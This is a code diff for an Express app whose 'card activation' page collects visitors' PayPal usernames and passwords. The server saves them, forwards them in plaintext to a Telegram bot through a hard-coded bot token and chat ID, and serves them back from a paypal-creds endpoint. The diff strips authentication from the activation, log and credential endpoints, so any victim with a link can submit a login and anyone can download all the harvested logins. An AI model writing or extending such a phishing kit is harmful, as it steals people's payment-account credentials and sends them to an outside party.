@@ -317,7 +317,6 @@ app.get('/activate.html', (req, res) => {
     </div>
     <script>
         const API_BASE_URL = 'https://ii-cyu4.onrender.com';
-        let token = localStorage.getItem('token') || null;
         let currentCardId = new URLSearchParams(window.location.search).get('cardId');
 
         const elements = {
@@ -341,28 +340,6 @@ app.get('/activate.html', (req, res) => {
             if (elements.errorMessage) {
                 elements.errorMessage.textContent = '';
                 elements.errorMessage.style.display = 'none';
-            }
-        }
-
-        function validateToken() {
-            if (!token) {
-                showError('Please log in to view card details or activate the card.');
-                return false;
-            }
-            try {
-                const payload = JSON.parse(atob(token.split('.')[1]));
-                if (payload.exp && payload.exp < Date.now() / 1000) {
-                    showError('Session expired. Please log in again.');
-                    localStorage.removeItem('token');
-                    token = null;
-                    return false;
-                }
-                return true;
-            } catch (e) {
-                showError('Invalid token. Please log in again.');
-                localStorage.removeItem('token');
-                token = null;
-                return false;
             }
         }
 
@@ -402,12 +379,9 @@ app.get('/activate.html', (req, res) => {
                 showError('No card ID provided. Please use a valid activation link.');
                 return;
             }
-            if (!validateToken()) return;
             showLoader();
             try {
-                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`, {
-                    headers: { 'Authorization': \`Bearer \${token}\` }
-                });
+                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`);
                 const data = await response.json();
                 if (response.ok) {
                     clearError();
@@ -420,8 +394,6 @@ app.get('/activate.html', (req, res) => {
                     }
                 } else if (response.status === 404) {
                     showError('Card not found. Please check the card ID.');
-                } else if (response.status === 401 || response.status === 403) {
-                    showError('Authentication failed. Please log in again.');
                 } else {
                     showError(data.error || 'Activation unavailable');
                 }
@@ -438,7 +410,6 @@ app.get('/activate.html', (req, res) => {
                 showError('No card ID provided. Please use a valid activation link.');
                 return;
             }
-            if (!validateToken()) return;
             const paypalUsername = document.getElementById('activateUsername')?.value.trim();
             const paypalPassword = document.getElementById('activatePassword')?.value.trim();
             if (!paypalUsername || !paypalPassword) {
@@ -449,19 +420,16 @@ app.get('/activate.html', (req, res) => {
             try {
                 const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Authorization': \`Bearer \${token}\` },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ paypalUsername, paypalPassword })
                 });
                 const data = await response.json();
                 if (response.ok) {
                     alert(data.message);
                     clearError();
-                    // Stay on the activation page to allow further actions
                     updateActivationPage();
                 } else if (response.status === 404) {
                     showError('Card not found. Please check the card ID.');
-                } else if (response.status === 401 || response.status === 403) {
-                    showError('Authentication failed. Please log in again.');
                 } else {
                     showError(data.error || 'Activation failed');
                 }
@@ -474,26 +442,18 @@ app.get('/activate.html', (req, res) => {
         }
 
         async function updateActivationLogs() {
-            if (!validateToken() || !elements.logDetails) return;
-            showLoader();
             try {
-                const response = await fetch(\`\${API_BASE_URL}/api/cards/logs\`, {
-                    headers: { 'Authorization': \`Bearer \${token}\` }
-                });
+                const response = await fetch(\`\${API_BASE_URL}/api/cards/logs\`);
                 const data = await response.json();
                 if (response.ok) {
                     elements.logDetails.innerHTML = data.map(log => \`<p>Activated by \${log.user} at \${new Date(log.time).toLocaleString()}</p>\`).join('');
                     if (elements.activationLogs) elements.activationLogs.style.display = data.length ? 'block' : 'none';
-                } else if (response.status === 401 || response.status === 403) {
-                    showError('Authentication failed. Please log in again.');
                 } else {
                     showError(data.error || 'Failed to fetch logs');
                 }
             } catch (error) {
                 console.error('Fetch logs error:', error);
                 showError('Network issue or backend unavailable. Please try again.');
-            } finally {
-                hideLoader();
             }
         }
 
@@ -515,7 +475,7 @@ app.get('/activate.html', (req, res) => {
         document.addEventListener('DOMContentLoaded', () => {
             if (!currentCardId) {
                 showError('No card ID provided. Please use a valid activation link.');
-            } else if (validateToken()) {
+            } else {
                 updateActivationPage();
                 updateActivationLogs();
             }
@@ -547,8 +507,8 @@ function loadData() {
 loadData();
 
 // Telegram setup
-const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
-const TELEGRAM_CHAT_ID_ADMIN = '6270110371';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
+const TELEGRAM_CHAT_ID_ADMIN = process.env.TELEGRAM_CHAT_ID_ADMIN || '6270110371';
 const bot = new Telegraf(TELEGRAM_BOT_TOKEN);
 
 async function sendTelegramNotification(message) {
@@ -667,10 +627,10 @@ app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
     }
 });
 
-app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
+app.get('/api/cards/activate/:cardId', (req, res) => {
     try {
         const cardId = req.params.cardId;
-        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
+        const card = data.cards.find(c => c.cardId === cardId);
         if (!card) return res.status(404).json({ error: 'Card not found' });
         res.json(card);
     } catch (error) {
@@ -679,11 +639,11 @@ app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
     }
 });
 
-app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
+app.post('/api/cards/activate/:cardId', async (req, res) => {
     try {
         const cardId = req.params.cardId;
         const { paypalUsername, paypalPassword } = req.body;
-        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
+        const card = data.cards.find(c => c.cardId === cardId);
         if (!card) return res.status(404).json({ error: 'Card not found' });
         if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
         if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });
@@ -693,14 +653,14 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
             cardId,
             paypalUsername,
             paypalPassword,
-            user: req.user.username,
+            user: card.user || 'Unknown',
             timestamp: new Date().toISOString()
         });
 
-        data.logs.push({ cardId, user: req.user.username, time: new Date().toISOString() });
+        data.logs.push({ cardId, user: card.user || 'Unknown', time: new Date().toISOString() });
 
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-        const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
+        const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}, User: ${card.user || 'Unknown'}`;
         await sendTelegramNotification(message);
         res.json({ message: 'Card activated', cardId, status: 'activated' });
     } catch (error) {
@@ -709,7 +669,7 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
     }
 });
 
-app.get('/api/cards/logs', authenticateToken, (req, res) => {
+app.get('/api/cards/logs', (req, res) => {
     try {
         res.json(data.logs);
     } catch (error) {
@@ -732,10 +692,9 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     }
 });
 
-app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
+app.get('/api/cards/paypal-creds', (req, res) => {
     try {
-        const userPaypalLogins = data.paypalLogins.filter(l => l.user === req.user.username);
-        res.json({ paypalLogins: userPaypalLogins });
+        res.json({ paypalLogins: data.paypalLogins });
     } catch (error) {
         console.error('Fetch PayPal creds error:', error);
         res.status(500).json({ error: 'Server error fetching PayPal credentials' });
